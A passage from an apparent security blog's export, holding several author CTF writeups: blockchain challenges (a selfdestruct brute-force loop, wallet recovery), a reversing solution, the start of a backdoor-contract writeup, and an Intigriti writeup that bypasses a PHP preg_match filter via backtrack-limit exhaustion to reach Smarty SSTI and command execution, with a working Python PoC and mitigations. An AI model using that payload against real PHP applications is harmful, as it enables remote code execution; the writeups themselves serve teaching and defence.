$ cast send $TARGET \u0026#34;sendRandomETH()\u0026#34; --rpc-url $RPC_URL --private-key $PVK HTB{1_f0rg0r_s0m3_U}\n","date":"9 March 2024","externalUrl":null,"permalink":"/posts/htb-cyberapocalypse-2024/luckyfaucet/","section":"Blog","summary":"Author writeup for the \u0026ldquo;LuckyFaucet\u0026rdquo; easy blockchain challenge from CyberApocalypse CTF 2024.","title":"HTB Cyber Apocalypse 2024 - LuckyFaucet [Author Writeup]","type":"posts"},{"content":" Recovery # Date: 9th March 2024 Challenge Author: perrythepwner Difficulty: Very Easy Category: Blockchain\nsimonedimaria/my-ctf-challenges My authored CTF challenges sources and official writeups Solidity 1 0 /tree/main/HTB-CyberApocalypse-2024/Recovery TL;DR # The challenge consist in recovery stolen BTC funds given an Electrum seed phrase in an hacked ssh instance. Description # Hacker, help! During the war our infrastructure was compromised as were the private keys to our Bitcoin wallet that we kept.\nWe managed to track the hacker and were able to get some SSH credentials into one of his personal cloud instances, can you try to recover my Bitcoins?\nsatoshi:L4mb0Pr0j3ct\nNOTE: Network is regtest, check connection info in the handler first.\nSkills Required # None Skills Learned # Bitcoin wallets Bitcoin regtest network Wallets seed phrases Electrum wallet setup \u0026amp; interaction Sending Bitcoins Enumeration # We must find a way to recover the funds that were stolen from us.\nWe have been given an ssh instance that we can access with the credentials: satoshi:L4mb0Pr0j3ct\nOnce we login in we\u0026rsquo;ll note a electrum-wallet-seed.txt file inside the home directory. The players can google something like \u0026ldquo;electrum wallet seed\u0026rdquo; and find some interesting links:\nElectrum Seed Version System Restoring your standard wallet from seed - Bitcoin Electrum https://bitcoinelectrum.com/creating-an-electrum-wallet/ With these links alone the player will learn what\u0026rsquo;s a Bitcoin wallet, how to create/load it, what\u0026rsquo;s BIP39 etc.\nSolution # Wallet Recovery # Install Electrum wallet client Start the client in regtest mode as the description suggest Standard wallet \u0026ndash;\u0026gt; I already have seed \u0026ndash;\u0026gt; insert the seed phrase found in the ssh instance Change network to the Electrum server provided to connect to the blockchain We could also started Electrum with the correct server from the cli, with: ./electrum-4.4.6-x86_64.AppImage --regtest --oneserver -s 0.0.0.0:50001:t\nConnect to Challenge Handler to get the flag Send back the Bitcoin to the given address. HTB{n0t_y0ur_k3ys_n0t_y0ur_c01n5}\n","date":"9 March 2024","externalUrl":null,"permalink":"/posts/htb-cyberapocalypse-2024/recovery/","section":"Blog","summary":"Author writeup for the \u0026ldquo;Recovery\u0026rdquo; very-easy blockchain challenge from CyberApocalypse CTF 2024.","title":"HTB Cyber Apocalypse 2024 - Recovery [Author Writeup]","type":"posts"},{"content":" RussianRoulette # Date: 31st January 2024 Challenge Author: perrythepwner Difficulty: Very Easy Category: Blockchain\nsimonedimaria/my-ctf-challenges My authored CTF challenges sources and official writeups Solidity 1 0 /tree/main/HTB-CyberApocalypse-2024/RussianRoulette TL;DR # This challenge aims to be an entry level / warmup for the blockchain category. In order to solve, players need to send a bunch of transactions until they get lucky (i.e. pulling the trigger until the contract shot himself). Description # Welcome adventurer.\nThis is a warm-up to test if you have what it takes to tackle the thorny challenges of the realm. Are you brave enough to try to win this bag?\nSkills Required # Smart contract interaction. Skills Learned # Smart contract interaction. Block dependency Challenge scenario # Players will find an instance of a challenge handler when the challenge is launched, as well as the related smart contracts source code. The main objective of this warmup challenge is to understand how to interact with a smart contract.\nBy connecting to the challenge handler they will have 3 possible options:\n$ nc 0.0.0.0 8001 1 - launch new instance 2 - kill instance 3 - get flag Action? We must therefore first launch the game instance, which will also give us the information necessary to connect.\n$ nc 0.0.0.0 8001 1 - launch new instance 2 - kill instance 3 - get flag action? 1 Your private blockchain has been deployed. It will automatically terminate in 30 minutes. Here\u0026#39;s your connection info: Team UUID: d2ee1510-3547-41ee-9712-e504f9fa8d7c Player UUID: bd79e84b-a087-46ef-b815-9df3df2aeff9 RPC URL: http://0.0.0.0:8000/rpc/bd79e84b-a087-46ef-b815-9df3df2aeff9 Player Private Key: 0x891d623949bebefc41dabd95f8e0d9b81f5cc4924f1313c5f045df743fd70d13 Player Address: 0xcC2a1df34de11ea70879867d5b20A924DE684992 Setup Contract: 0x0570156bB596f10cf1354D488F01A9809B0C1F73 Target Contract: 0xf5d50Fe6c395aA0635Ac30039A9B3Fe16C99ef32 To connect to the blockchain we can use tools like web3.py, cast, etc. For the later exploitation, cast will be used.\nAnalyzing the source code # Let\u0026rsquo;s take a look to the given source codes.\nSetup.sol # pragma solidity 0.8.23; import {RussianRoulette} from \u0026#34;./RussianRoulette.sol\u0026#34;; contract Setup { RussianRoulette public immutable TARGET; constructor() payable { TARGET = new RussianRoulette{value: 10 ether}(); } function isSolved() public view returns (bool) { return msg.sender.balance \u0026gt;= 10 ether; } } This will, indeed, setup the challenge istance for us. We understand that a TARGET contract will be deployed with 10 ether in it, and in order to solve to challenge our balance needs to be \u0026gt;= 10 ether (stealing them from the newly deployed contract).\nRussianRoulette.sol # pragma solidity 0.8.23; contract RussianRoulette { constructor() payable { // i need more bullets } function pullTrigger() public returns (string memory) { if (uint256(blockhash(block.number - 1)) % 10 == 7) { selfdestruct(payable(msg.sender)); // üíÄ } else { return \u0026#34;im SAFU ... for now\u0026#34;; } } } This is the code we need to exploit. We can see that all the logic resides inside the pullTrigger() function.\nThe pullTrigger function will selfdestruct() to the interacting address (msg.sender) if some conditions are met. Otherwise it\u0026rsquo;ll just return a string telling us that it is \u0026ldquo;SAFU\u0026rdquo;.\nBut, what does selfdestruct() do?\nFrom Solidity 0.8.23 documentation the selfdestruct instruction will erase the code from the blockchain for the upcoming blocks, and will send all the Ether inside it, to the specified address.\nIn that case, the specified address, is msg.sender, which is the address that is sending the transaction in that moment.\nSounds interesting!\nNOTE: Starting from Solidity 0.8.24 (\u0026ldquo;Cancun\u0026rdquo; upgrade), it\u0026rsquo;ll change the behavior of \u0026ldquo;selfdestruct\u0026rdquo;. It will no longer clear the contract code unless it\u0026rsquo;s called on the deploying transaction. https://twitter.com/solidity_lang/status/1750775408013046257\nFun Fact: did you know that SELFDESTRUCT was once called SUICIDE and there is a SELFDESTRUCT alias for SUICIDE in Solidity? Here\u0026rsquo;s the official EIP: https://github.com/ethereum/EIPs/blob/master/EIPS/eip-6.md Having understood how selfdestruct() works in the Solidity version specified in the contract, we need to understand in what circumstances we will be rich.\nuint256(blockhash(block.number - 1)) % 10 == 7 This is the condition we need to trigger, which will simply take the previous block hash, convert it to uint256 (from bytes32), modulo it by 10, and if the reminder is 7, the contract will successfully headshot itself.\nCalling the function a bunch of times until we get lucky will do the work. That\u0026rsquo;s called a Block Dependency issue, even if an unprotected selfdestruct on random function calls won\u0026rsquo;t be a smart idea anyway :P\nExploitation # while True: # try luck system(\u0026#34;cast send $TARGET \u0026#39;pullTrigger()\u0026#39; --rpc-url $RPC_URL --private-key $PVK\u0026#34;) # get flag with remote(\u0026#34;0.0.0.0\u0026#34;, HANDLER_PORT) as p: p.recvuntil(b\u0026#34;action? \u0026#34;) p.sendline(b\u0026#34;3\u0026#34;) flag = p.recvall().decode() if \u0026#34;HTB\u0026#34; in flag: print(f\u0026#34;\\n\\n[*] {flag}\u0026#34;) break HTB{99%_0f_g4mbl3rs_quit_b4_bigwin}\n","date":"9 March 2024","externalUrl":null,"permalink":"/posts/htb-cyberapocalypse-2024/russianroulette/","section":"Blog","summary":"Author writeup for the \u0026ldquo;RussianRoulette\u0026rdquo; very-easy blockchain challenge from CyberApocalypse CTF 2024.","title":"HTB Cyber Apocalypse 2024 - RussianRoulette [Author Writeup]","type":"posts"},{"content":"","date":"9 March 2024","externalUrl":null,"permalink":"/tags/integer-underflow/","section":"Tags","summary":"","title":"Integer-Underflow","type":"tags"},{"content":"","date":"9 March 2024","externalUrl":null,"permalink":"/tags/randomness/","section":"Tags","summary":"","title":"Randomness","type":"tags"},{"content":"Welcome to my personal blog!\n","date":"10 January 2024","externalUrl":null,"permalink":"/posts/","section":"Blog","summary":"","title":"Blog","type":"posts"},{"content":" Intigriti Monthly Challenge 1223 # Update:\nThis writeup was selected as the winner of the Intigriti December Challenge (1223) and was awarded a prize of 50‚Ç¨ on Intigriti swags \u0026ndash;\u0026gt; https://x.com/intigriti/status/1737861726517784601 .\nAt the moment of writing, this writeup it\u0026rsquo;s also part of the HackTricks wiki on the \u0026ldquo;PHP Tricks\u0026rdquo; section \u0026ndash;\u0026gt; https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#redos-bypass\nTL;DR # The challenge involved achieving RCE through SSTI on PHP\u0026rsquo;s Smarty template engine. This was accomplished by bypassing a filtering regex through backtracking, exceeding PHP\u0026rsquo;s default pcre.backtrack_limit, ultimately leading to a Segmentation Fault. According to the preg_match() documentation, the function returns false on failure, which will successfully bypass the restrictions. 0. Challenge description # The solution\u0026hellip;\nShould retrieve the flag from the web server. The flag format is INTIGRITI{.*}. Should NOT use another challenge on the intigriti.io domain. 1. Enumeration # 1.1) Challenge scenario # challenge first look Let\u0026rsquo;s go! Another Intigriti Challenge, time to get some coffe and win swa\u0026hellip;oh\u0026hellip;PHP\u0026hellip;regex\u0026hellip;\n1.2) Technologies # One of the first things we look at are technologies; insidious CVEs and known bugs could give us an easy win.\nUnfortunately, not this time, since Wappalyzer tell us that PHP version is 7.4.33, which is the latest for the PHP 7.x branch. However, it\u0026rsquo;s still PHP 7 and not 8, something to keep in mind.\nAs a second note of interest, the author of the challenge was kind enough to also give us the version used by Smarty - a well known template engine for PHP - which turns out to be 4.3.4. Once again, this version is the latest release of the project without known security bugs.\n1.3) Source code analysis # As mentioned previously, we are kindly provided with the source code of the challenge, so let\u0026rsquo;s take a look:\nif(isset($_GET[\u0026#39;source\u0026#39;])){ highlight_file(__FILE__); die(); } require(\u0026#39;/var/www/vendor/smarty/smarty/libs/Smarty.class.php\u0026#39;); $smarty = new Smarty(); $smarty-\u0026gt;setTemplateDir(\u0026#39;/tmp/smarty/templates\u0026#39;); $smarty-\u0026gt;setCompileDir(\u0026#39;/tmp/smarty/templates_c\u0026#39;); $smarty-\u0026gt;setCacheDir(\u0026#39;/tmp/smarty/cache\u0026#39;); $smarty-\u0026gt;setConfigDir(\u0026#39;/tmp/smarty/configs\u0026#39;); $pattern = \u0026#39;/(\\b)(on\\S+)(\\s*)=|javascript|\u0026lt;(|\\/|[^\\/\u0026gt;][^\u0026gt;]+|\\/[^\u0026gt;][^\u0026gt;]+)\u0026gt;|({+.*}+)/s\u0026#39;; if(!isset($_POST[\u0026#39;data\u0026#39;])){ $smarty-\u0026gt;assign(\u0026#39;pattern\u0026#39;, $pattern); $smarty-\u0026gt;display(\u0026#39;index.tpl\u0026#39;); exit(); } // returns true if data is malicious function check_data($data){ global $pattern; return preg_match($pattern,$data); } if(check_data($_POST[\u0026#39;data\u0026#39;])){ $smarty-\u0026gt;assign(\u0026#39;pattern\u0026#39;, $pattern); $smarty-\u0026gt;assign(\u0026#39;error\u0026#39;, \u0026#39;Malicious Inputs Detected\u0026#39;); $smarty-\u0026gt;display(\u0026#39;index.tpl\u0026#39;); exit(); } $tmpfname = tempnam(\u0026#34;/tmp/smarty/templates\u0026#34;, \u0026#34;FOO\u0026#34;); $handle = fopen($tmpfname, \u0026#34;w\u0026#34;); fwrite($handle, $_POST[\u0026#39;data\u0026#39;]); fclose($handle); $just_file = end(explode(\u0026#39;/\u0026#39;,$tmpfname)); $smarty-\u0026gt;display($just_file); unlink($tmpfname); What\u0026rsquo;s happening here?\nFirst of all, if we don\u0026rsquo;t provide the data parameter to the POST request, it simply render the same page again.\nif(!isset($_POST[\u0026#39;data\u0026#39;])){ $smarty-\u0026gt;assign(\u0026#39;pattern\u0026#39;, $pattern); $smarty-\u0026gt;display(\u0026#39;index.tpl\u0026#39;); exit(); } Then, our input $_POST['data'] undergoes a check by a regular expression in the check_data() function that use the preg_match() function of the PHP PCRE library.\nfunction check_data($data){ global $pattern; return preg_match($pattern,$data); } If the regex identifies a match, the server responds with \u0026ldquo;Malicious input detected\u0026rdquo; (AKA you won\u0026rsquo;t get the flag :P).\nif(check_data($_POST[\u0026#39;data\u0026#39;])){ $smarty-\u0026gt;assign(\u0026#39;pattern\u0026#39;, $pattern); $smarty-\u0026gt;assign(\u0026#39;error\u0026#39;, \u0026#39;Malicious Inputs Detected\u0026#39;); $smarty-\u0026gt;display(\u0026#39;index.tpl\u0026#39;); exit(); } Otherwise, our input is written into a temporary file (with a randomly generated name)\n$tmpfname = tempnam(\u0026#34;/tmp/smarty/templates\u0026#34;, \u0026#34;FOO\u0026#34;); $handle = fopen($tmpfname, \u0026#34;w\u0026#34;); fwrite($handle, $_POST[\u0026#39;data\u0026#39;]); fclose($handle); and this file is passed to the Smarty display() function. This function essentially processes the template and outputs it.\n$just_file = end(explode(\u0026#39;/\u0026#39;,$tmpfname)); $smarty-\u0026gt;display($just_file); unlink($tmpfname); Thus, our objective is probably to exploit SSTI, Server-Side Template Injection: a vulnerability that arises when an arbitrary user input with the native template syntax (like the example below), is fed into the template engine (Smarty in our case) and gets executed server-side.\n{system(\u0026#39;ls\u0026#39;)} // the ls command gets executed! It\u0026rsquo;s evident that if we manage to evade the regex and allow curly brackets to be included in the temporary file, we achieve Remote Command Execution (RCE).\n1.4) Regex breakdown # Now let\u0026rsquo;s take a look at the regex in detail.\n/(\\b)(on\\S+)(\\s*)=|javascript|\u0026lt;(|\\/|[^\\/\u0026gt;][^\u0026gt;]+|\\/[^\u0026gt;][^\u0026gt;]+)\u0026gt;|({+.*}+)/s Attribute Event Handlers:\n(\\b)(on\\S+)(\\s*)=: This part is designed to identify potential event handlers in HTML attributes that start with \u0026ldquo;on\u0026rdquo; (e.g., onclick, onmouseover). (\\b): Word boundary to ensure that \u0026ldquo;on\u0026rdquo; is the beginning of a word. (on\\S+): Matches \u0026ldquo;on\u0026rdquo; followed by one or more non-whitespace characters. (\\s*): Matches any whitespace characters following the event handler. =: Looks for the equal sign indicating the start of an attribute value. Javascript String:\njavascript: This part simply looks for the string \u0026ldquo;javascript,\u0026rdquo; which could indicate an attempt to execute JavaScript code. HTML Tags:\n\u0026lt;(|\\/|[^\\/\u0026gt;][^\u0026gt;]+|\\/[^\u0026gt;][^\u0026gt;]+)\u0026gt;: This section attempts to match HTML tags. \u0026lt;: Matches the opening bracket of an HTML tag. (|\\/|[^\\/\u0026gt;][^\u0026gt;]+|\\/[^\u0026gt;][^\u0026gt;]+): This part is more complex: \\/: Matches a forward slash, possibly indicating a self-closing tag.\nOR (|) [^\\/\u0026gt;][^\u0026gt;]+: Matches characters that are not a forward slash or a closing bracket, ensuring that the tag has some content.\nOR (|) \\/[^\u0026gt;][^\u0026gt;]+: Matches a forward slash followed by characters, ensuring the tag has some content. \u0026gt;: Matches the closing bracket of an HTML tag. Curly Braces Content:\n({+.*}+): This part attempts to match content enclosed in curly braces. Breaking it down: {+: Matches one or more opening curly braces. .*: Matches any characters (zero or more). }+: Matches one or more closing curly braces. 2. Exploitation # I was searching far and wide for an attack vector, staring at the regex on regex101 trying to find some flaws where I could throw my { } to get SSTI\u0026hellip;\nUntil I realized that I probably shouldn\u0026rsquo;t focus on the regex ITSELF but more on the context in which it was used.\nKnowing the beautiful pearls of wisdom that PHP gifts us, I started looking for the usual evasion techniques:\nType Juggling Null Byte Injection (something that would have worked back in 2008 lol) or even leaving \u0026lt;?php tag open and letting the server fix it (taking inspiration from mutation XSS). However, none of these approaches were allowing me to win. Actually, for the last idea, it would only work if the application saved our files with the .php extension and not just a random name as a result of tempnam().\nIndeed, observe how the same file with an unclosed PHP tag inside will be interpreted differently by the server with the extension as the only difference:\nRendering of file with \u0026lt;?php tag open WITHOUT .php extension VS WITH .php extension But that was not the case.\nAnyway, I began looking into various documentations, starting with the Smarty documentation and then referring to the PHP documentation for information about the various functions used in the code. Usually, you can find warnings about how specific functions should be implemented, and, in fact, reading the PHP documentation of preg_match(), I came across this one:\npreg_match() Documentation warning\u0026hellip;PHP\u0026hellip;why???? Ummmmhh, can this be useful to us somehow?\nCertainly! Take another look at the code where preg_match() is involved:\n// returns true if data is malicious function check_data($data){ global $pattern; return preg_match($pattern,$data); } Yea, the comments says it returns true if the pattern matches our input, but in reality, it returns 1 if it matches, 0 if it does not match, and it returns false if the regex fails!\nThen the return value is used as condition in a if statement without strict type checks! (classic PHP oversights)\nif(check_data($_POST[\u0026#39;data\u0026#39;])){ [...] // we are bad people exit(); } Let\u0026rsquo;s quickly test in the PHP console what happens when the return value of the check_data() function is 1, 0 or false:\nWe may have found the path.\n2.1) filter bypass via ReDoS that causes SIGSEGV in PCRE # Now the question is:\nHow can we cause the preg_match() to fail?\nLuckily for me, lately I had to deal with challenges where a \u0026ldquo;ReDoS\u0026rdquo; made a Race Condition possible, I have also recently started a project where I had to deal a lot with regexes and therefore I also had to fight with the regex backtracking nightmare.\nSo I know how to make a regex do bad things. And knowing what a \u0026ldquo;ReDoS\u0026rdquo; is, helped me to find what i was searching for.\nHowever, in the context of this challenge I still didn\u0026rsquo;t know what the conditions were for causing unexpected behaviors. I just knew I had somehow to blow things up.\nSo, I thought Google might have something exotic to offer me. Searching for \u0026ldquo;php preg_match ReDoS\u0026rdquo; or \u0026ldquo;php regex failure,\u0026rdquo; you can find some interesting articles:\nOWASP ReDoS The Explosive Quantifier Trap Regexploit: DoS-able Regular Expressions Bad Meets evil - PHP meets Regular Expressions PHP regular expression functions causing segmentation fault Everything lead to one path, specially the latest two blogs.\nIn short the problem happens because the preg_* functions in PHP builds upon the PCRE library. In PCRE certain regular expressions are matched by using a lot of recursive calls, which uses up a lot of stack space. It is possible to set a limit on the amount of recursions allowed, but in PHP this limit defaults to 100.000 which is more than fits in the stack.\nThis Stackoverflow thread was also linked in the post where it is talked more in depth about this issue. Our task was now clear:\nSend an input that would make the regex do 100_000+ recursions, causing SIGSEGV, making the preg_match() function return false thus making the application think that our input is not malicious, throwing the surprise at the end of the payload something like {system(\u0026lt;verybadcommand\u0026gt;)} to get SSTI \u0026ndash;\u0026gt; RCE \u0026ndash;\u0026gt; flag :).\nI had two options to get there:\nSend a load of shit and pray. Reflect on which points the regex was backtracking the most and give calculated weight to those weak points. Since I didn\u0026rsquo;t want to destroy the challenge\u0026rsquo;s infrastructure, I opted for the latter.\nFirst of all, we need to put pressure on the Explosive Quantifier * that we can find in the first part of the regex:\n(\\b)(on\\S+)(\\s*)= Let\u0026rsquo;s start by matching the word boundary (\\b) , meaning that the matching group that comes after will be captured as a whole word.\nThen we need to match the \u0026ldquo;on\u0026rdquo; and we\u0026rsquo;re ready to give our Christmas gift of \u0026ldquo;X\u0026rdquo; characters to the quantifier explosive \u0026ldquo;*\u0026rdquo;, which will match all the \u0026ldquo;X\u0026rdquo; characters, moving the pointer forward by n positions where n is the number of our \u0026ldquo;X\u0026rdquo; characters.\nThis is the opposite of what would have happened with the \u0026ldquo;greedy\u0026rdquo; quantifier ( *?), which would have halved the number of iterations. It seems complicated, so let\u0026rsquo;s go and visualize it on regex101 using the debugger.\nOk, let\u0026rsquo;s craft something evil now.\nWe need at least 100k iterations. Easy. Let\u0026rsquo;s fill the payload with 'X'*100_000\u0026hellip; buuut it\u0026rsquo;s not working.\nWhy?\nWell, in regex terms, we\u0026rsquo;re not actually doing 100k \u0026ldquo;recursions\u0026rdquo;, but instead we\u0026rsquo;re counting \u0026ldquo;backtracking steps\u0026rdquo;, which as the PHP documentation states it defaults to 1_000_000 (1M) in the pcre.backtrack_limit variable.\nTo reach that, 'X'*500_001 will result in 1 million backtracking steps (500k forward and 500k backwards).\nLet\u0026rsquo;s try.\npayload = f\u0026#34;@dimariasimone on{\u0026#39;X\u0026#39;*500_001} {{system(\u0026#39;id\u0026#39;)}}\u0026#34; Profit!\n2.2) PoC # import requests URL = \u0026#39;https://challenge-1223.intigriti.io/challenge.php\u0026#39; data={\u0026#39;data\u0026#39;:f\u0026#34;@dimariasimone on{\u0026#39;X\u0026#39;*500_001} {{system(\u0026#39;cat /flag.txt\u0026#39;)}}\u0026#34;} #print(data) r = requests.post(URL, data=data) print(r.text.split(\u0026#39; \u0026#39;)[-1]) Flag: INTIGRITI{7h3_fl46_l457_71m3_w45_50_1r0n1c!}\n3. Mitigation # To mitigate the issue, we have some work to do.\nA solution could be to avoid using PHP altogether, but I understand that some people may be fond of it :/\nHere are some mitigation steps:\nUnder PHP, this maximum recursion depth is specified with the pcre.recursion_limit configuration variable and (unfortunately) the default value is set to 100,000. This value is TOO BIG! Here is a table of safe values of pcre.recursion_limit for a variety of executable stack sizes: Stacksize pcre.recursion_limit 64 MB 134217 32 MB 67108 16 MB 33554 8 MB 16777 4 MB 8388 2 MB 4194 1 MB 2097 512 KB 1048 256 KB 524 Since preg_match() returns false on failure and 1 and 0 respectively if the match was successful and if not, we should do some strict type checking. NOTE: this is just a quick fix in the challenge context, generally speaking using the preg_last_error() function and defining behaviours for each case is a better solution.\nUse regex timeouts: Set a maximum execution time or timeout for regex pattern matching. Use alternatives to regular expressions, such as string manipulation functions or parsing libraries. My job here is done ","date":"20 December 2023","externalUrl":null,"permalink":"/posts/intigriti-challenges/1223/","section":"Blog","summary":"Writeup for Intigriti December Challenge (1223)","title":"Intigriti Monthly Challenge 1223","type":"posts"},{"content":"","date":"20 December 2023","externalUrl":null,"permalink":"/tags/pcre-preg_match/","section":"Tags","summary":"","title":"PCRE Preg_match","type":"tags"},{"content":"","date":"20 December 2023","externalUrl":null,"permalink":"/tags/php/","section":"Tags","summary":"","title":"PHP","type":"tags"},{"content":"","date":"20 December 2023","externalUrl":null,"permalink":"/tags/rce/","section":"Tags","summary":"","title":"RCE","type":"tags"},{"content":"","date":"20 December 2023","externalUrl":null,"permalink":"/tags/redos/","section":"Tags","summary":"","title":"ReDoS","type":"tags"},{"content":"","date":"20 December 2023","externalUrl":null,"permalink":"/tags/smarty/","section":"Tags","summary":"","title":"Smarty","type":"tags"},{"content":"","date":"20 December 2023","externalUrl":null,"permalink":"/tags/ssti/","section":"Tags","summary":"","title":"SSTI","type":"tags"},{"content":" HTB University CTF 2023 - WindowsOfOpportunity # TL;DR # The challenge consisted of reversing a window-sliding algorithm knowing a known byte and/or bruteforcing it. Challenge description # You\u0026rsquo;ve located a zombie hideout and are trying to peek inside. Suddenly, a window opens a crack and a zombie peers out - they want a password\u0026hellip;\nChallenge scenario # We\u0026rsquo;re given an executable, decompiling it with Ghidra will result in the following:\nint main(void) { char local_38 [43]; char local_d; uint local_c; puts(\u0026#34;A voice comes from the window... \\\u0026#39;Password?\\\u0026#39;\u0026#34;); fgets(local_38,0x2a,stdin); local_c = 0; while( true ) { if (0x24 \u0026lt; local_c) { puts(\u0026#34;The window opens to allow you passage...\u0026#34;); return 0; } local_d = local_38[(int)(local_c + 1)] + local_38[(int)local_c]; if (local_d != arr[(int)local_c]) break; local_c = local_c + 1; } puts(\u0026#34;The window slams shut...\u0026#34;); return -1; } The code is quite simple and short, it appears to be a simple window-sliding algorithm to check the password (i.e. the flag).\nMeaning that, for each index of our input, it\u0026rsquo;ll take the corresponding byte and the following one, sum them, and if their sum corresponds to the corresponding index value saved in the global variable arr the execution continues. Until eventually \u0026ldquo;The window opens to allow you passage\u0026hellip;\u0026rdquo; (i.e we\u0026rsquo;ve discovered the flag).\nThe code it\u0026rsquo;s already clear enough to be able to reproduce a reversing algorithm, but for readability sake here\u0026rsquo;s a refactored version:\nint main(void) { char input [43]; char sum; int n; puts(\u0026#34;A voice comes from the window... \\\u0026#39;Password?\\\u0026#39;\u0026#34;); fgets(input,42,stdin); n = 0; while( true ) { if (36 \u0026lt; n) { puts(\u0026#34;The window opens to allow you passage...\u0026#34;); return 0; } sum = input[n + 1] + input[n]; if (sum != arr[n]) break; n = n + 1; } puts(\u0026#34;The window slams shut...\u0026#34;); return -1; } This is instead the global variable arr:\n00104060 9c [0] 00104061 96 [1] 00104062 bd [2] 00104063 af [3] 00104064 93 [4] 00104065 c3 [5] 00104066 94 [6] 00104067 60 [7] 00104068 a2 [8] 00104069 d1 [9] 0010406a c2 [10] 0010406b cf [11] 0010406c 9c [12] 0010406d a3 [13] 0010406e a6 [14] 0010406f 68 [15] 00104070 94 [16] 00104071 c1 [17] 00104072 d7 [18] 00104073 ac [19] 00104074 96 [20] 00104075 93 [21] 00104076 93 [22] 00104077 d6 [23] 00104078 a8 [24] 00104079 9f [25] 0010407a d2 [26] 0010407b 94 [27] 0010407c a7 [28] 0010407d d6 [29] 0010407e 8f [30] 0010407f a0 [31] 00104080 a3 [32] 00104081 a1 [33] 00104082 a3 [34] 00104083 56 [35] 00104084 9e [36] Solution # We have therefore understood that to solve the challenge we must find the correct bytes which, added together, will give a certain value.\nBut how do we know which is the exact pair of bytes that will give us the flag piece by piece?\nThinking about it, the combination of interest is very easy to bruteforce, but it is even easier if we knew even just one byte of the \u0026ldquo;secret\u0026rdquo; to discover, given that to obtain the subsequent ones it will be enough to do a simple subtraction!\nWhy?\nLet\u0026rsquo;s visualize the algorithm:\nAt the first iteration, the first two bytes (b1 and b2) are taken into consideration, their sum (sum0) should be equal to arr[0] which is 0x9c (156).\nAt the second iteration, the second byte (again) and the third byte (b1 and b2) are taken in consideration, their sum (sum1) should be equal to arr[1] which is 0x96 (150).\nTherefore, knowing sum0 from arr[0], and assuming that we also know b0 then b1 is simply the value of sum0-b0. Thus obtaining b1, the value of b2 is simply sum1-b1 and so on.\nAaand, we know b0! Since the flag starts with HTB{, therefore b0 == H == 0x48 == 72. Let\u0026rsquo;s write a simple reversing script in python:\n#!/usr/bin/env python arr = [0x9c, 0x96, 0xbd, 0xaf, 0x93, 0xc3, 0x94, 0x60, 0xa2, 0xd1, 0xc2, 0xcf, 0x9c, 0xa3, 0xa6, 0x68, 0x94, 0xc1, 0xd7, 0xac, 0x96, 0x93, 0x93, 0xd6, 0xa8, 0x9f, 0xd2, 0x94, 0xa7, 0xd6, 0x8f, 0xa0, 0xa3, 0xa1, 0xa3, 0x56, 0x9e] flag = [ord(\u0026#39;H\u0026#39;)] for i, sum in enumerate(arr): flag.append(sum-flag[i]) for c in flag: print(chr(c),end=\u0026#39;\u0026#39;) ‚îî‚îÄ$ python exploit.py HTB{4_d00r_cl0s35_bu7_4_w1nd0w_0p3n5!} Flag: HTB{4_d00r_cl0s35_bu7_4_w1nd0w_0p3n5!}\n","date":"26 October 2023","externalUrl":null,"permalink":"/posts/htb-universityctf-2023/windowsofopportunity/","section":"Blog","summary":"Writeup for WindowsOfOpportunity reversing challenge of HackTheBox University CTF 2023.","title":"HackTheBox University CTF 2023 - WindowsOfOpportunity","type":"posts"},{"content":"","date":"26 October 2023","externalUrl":null,"permalink":"/categories/rev/","section":"Categories","summary":"","title":"Rev","type":"categories"},{"content":"","date":"26 October 2023","externalUrl":null,"permalink":"/tags/window-sliding/","section":"Tags","summary":"","title":"Window-Sliding","type":"tags"},{"content":"","date":"10 July 2023","externalUrl":null,"permalink":"/tags/backdoor/","section":"Tags","summary":"","title":"Backdoor","type":"tags"},{"content":"","date":"10 July 2023","externalUrl":null,"permalink":"/tags/bytecode/","section":"Tags","summary":"","title":"Bytecode","type":"tags"},{"content":"","date":"10 July 2023","externalUrl":null,"permalink":"/tags/cfg/","section":"Tags","summary":"","title":"CFG","type":"tags"},{"content":"2244 ELECTIONS\nDate: 10th July 2023 Challenge Author: perrythepwner Difficulty: Medium Category: Blockchain\nsimonedimaria/my-ctf-challenges My authored CTF challenges sources and official writeups Solidity 1 0 /tree/main/HTB-BusinessCTF-2023/2244_ELECTIONS TL;DR # The challenge consists of a smart contract e-voting system which turns out to have a backdoor as a private function. The source code is not provided, through the JSON-RPC the players must take the bytecode deployed on the blockchain and reverse it to discover and exploit the backdoor. Description # It\u0026rsquo;s the year 2244 and it\u0026rsquo;s Elections time between United Nations of Zenium (UNZ) and Board of Arodor (BoA) to establish the new world order. You, a skilled hacker aligned with the United Nations of Zenium, suspected the presence of a well-concealed backdoor in the e-voting system that could manipulate the outcome of the elections.\nThe source code is not public, but nothing is secret on the block\u0026hellip;\nSkills Required # EVM basics. Basic Solidity bytecode reversing: decompiling, EVM opcodes. Smart Contract interaction without ABI: function signatures, constructing raw TXs. Skills Learned # Reverse engineering smart contracts from the compiled bytecode. JSON-RPC interaction and calling methods. Reading smart contracts private variables via storage. Identify backdoors on unverified smart contracts. Reading CFG of smart contracts. Enumeration # EVM background # In the EVM, nothing is secret. This is the reason why usually hiding passwords, keys, scams, in a deployed smart contract is not a great idea. However, those who have to hide something in the blockchain, try to obfuscate it as much as possible, to be less accessible as possible to the majority of people. The most commonly used techniques are:\nprivate functions and private variables (can be called only by the contract itself). non-verified smart contract (contract code is not public). Challenge scenario # With this challenge we\u0026rsquo;ll learn to extract the bytecode (necessarily deployed in the blockchain) via the JSON-RPC endpoint and reverse the \u0026ldquo;hidden\u0026rdquo; code to understand how it works. The simulated real-world scenario is presented as an e-voting system. The challenge walkthrough will be done without looking at the source code at the beginning to put us in the player\u0026rsquo;s point of view, which is more realistic.\nThis is what it\u0026rsquo;s presented on the voting platform:\nThere is /home and /connection endpoints. On the page it\u0026rsquo;s displayed the current elections status: the Board of Arodor dictatorship has already a clear advantage over the United Nations of Zenium democracy: 99% vs 8% \u0026hellip; a bit suspicious.\nInteracting with the platform # Clicking on the \u0026ldquo;vote\u0026rdquo; buttons a popup appears that allows us to cast our vote in favor of one party or another:\nLet\u0026rsquo;s try to vote for UNZ.\nWe want UNZ to win, so let\u0026rsquo;s try to vote again and open Network Monitor to see which requests are being sent to the backend.\nClearly the platform doesn\u0026rsquo;t allow this. Only one vote per account is given. Looking at the requests made, we see a call to /connection_info which connects our web3 account to the platform (simulated metamask behavior) and gives us respectively the addresses for the e-voting contract and Setup contract. Then we made RPC calls to /rpc methods with the following methods:\neth_sendTransaction: constructing and sending the raw TX with our encoded input on data 